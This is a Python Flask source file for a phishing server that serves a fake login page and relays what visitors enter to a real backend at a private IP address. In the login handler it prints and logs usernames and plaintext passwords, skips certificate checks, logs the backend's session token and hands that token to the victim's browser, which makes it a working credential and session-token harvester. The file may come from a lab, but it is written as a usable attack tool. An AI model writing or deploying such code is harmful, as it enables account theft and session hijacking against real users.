from flask import Flask, request, jsonify, render_template, request
import webbrowser
import random
from flask import make_response
import json
import requests
import logging

session_tokens = {}

app = Flask(__name__,
            template_folder='templates_phishing', 
            static_folder='static')  
 
@app.route('/')
def home():
    return render_template('index_phishing.html')


def generate_code():
    return str(random.randint(100000, 999999))

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    fingerprint = data.get('fingerprint')
    fingerprint_data = json.loads(fingerprint)
   
    session_tokens["last_login"] = {
        "username": username,
        "password": password,
    }
    logging.basicConfig(filename='login_attempts.log',
                        level=logging.INFO,
                        format='%(asctime)s - %(message)s')
    
    # Just log the input
    print(f"User attempted login with:\nUsername: {username}\nPassword: {password}")

    try:
        # Sending POST request to the backend 
        response = requests.post("https://192.168.0.46:5000/login", json=data, verify=False)
        session_token_ = response.cookies.get('session_token')
        print(session_token_)
    
        # If the request was successful
        if response.status_code == 200:
            logging.info(f"Successful login with: Username: {username}, Password: {password}, Status: {response.status_code}")
            logging.info(f"Session token: {session_token_}") ##logging session code

        
            resp = make_response(jsonify({'success': True, 'message': 'Login successful!'}))
            resp.set_cookie("session_token", session_token_)
            return resp
 
        elif response.status_code == 400:
            print("Missing Login credentials")
            logging.info(f"User attempt log in: Username: {username}, Password: {password}, Status: {response.status_code}")
            return jsonify({"success": False, "message": "Please enter username and password."}), 400
        elif response.status_code == 401:
            logging.info(f"User attempt log in: Username: {username}, Password: {password}, Status: {response.status_code}")
            return jsonify({"success": False, "message": "Invalid credentials"}), 401
        else:
            logging.info(f"User attempt log in: Username: {username}, Password: {password}, Status: {response.status_code}")
            return jsonify({"success": False, "message": "Backend error"}), response.status_code
    except Exception as e:
        print(f"Error forwarding login data: {e}")
        return jsonify({"success": False, "message": "Error forwarding data"}), 500

def open_browser():    
    webbrowser.open_new("https://192.168.0.46:5002/") # Option for TLS handshaking

# Launch Website    
if __name__ == '__main__':
        host_ip = '0.0.0.0'  # Listen on all available interfaces
        port = 5002
        print(f"Backend server is running at https://{host_ip}:{port}")
        print(f"Access from another device using your computer's IP address and port {port}")

        ssl_easy = ('../certs/cert.pem', '../certs/key.pem')
        app.run(debug=True, host=host_ip, port=port, ssl_context=ssl_easy) 
    